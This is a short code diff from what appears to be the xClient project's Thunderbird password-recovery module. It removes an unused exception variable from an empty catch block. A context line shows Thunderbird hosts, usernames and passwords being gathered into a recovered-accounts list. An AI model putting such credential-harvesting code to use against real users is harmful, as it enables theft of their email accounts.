@@ -90,7 +90,7 @@ namespace xClient.Core.Recovery.Other
                     thunderbirdPasswords.Add(new RecoveredAccount() { URL = host, Username = username, Password = password, Application = "Thunderbird" });
                 }
             }
-            catch (Exception e)
+            catch (Exception)
             {
             }
 
